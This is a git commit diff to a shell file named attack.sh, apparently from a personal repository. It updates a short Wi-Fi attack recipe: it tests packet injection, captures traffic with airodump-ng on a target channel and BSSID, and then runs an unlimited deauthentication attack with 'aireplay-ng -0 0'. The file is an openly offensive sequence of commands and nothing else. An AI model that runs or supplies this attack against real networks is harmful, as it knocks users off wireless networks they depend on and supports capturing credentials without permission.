50e27f46ef198cb8f05675bd27f428edca871d2a
Kaal Bhairav <69183626+kaal-bhairav-cpu@users.noreply.github.com>
2023-08-27 18:21:35 +0530

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,4 +1,10 @@
-airodump-ng wlan1
-airodump-ng -c [Channel number] --bssid [main mac] wlan1
+To check Packet injection is working or not 
+sudo aireplay-ng --test wlan0
+
+Then run this commands
+
+sudo airodump-ng wlan0
+sudo airodump-ng -c [Channel number] --bssid [main mac] wlan0
 # Next Tab
-aireplay-ng -0 0 -a [main mac] wlan1
+sudo aireplay-ng -0 0 -a [main mac] wlan0
+ 
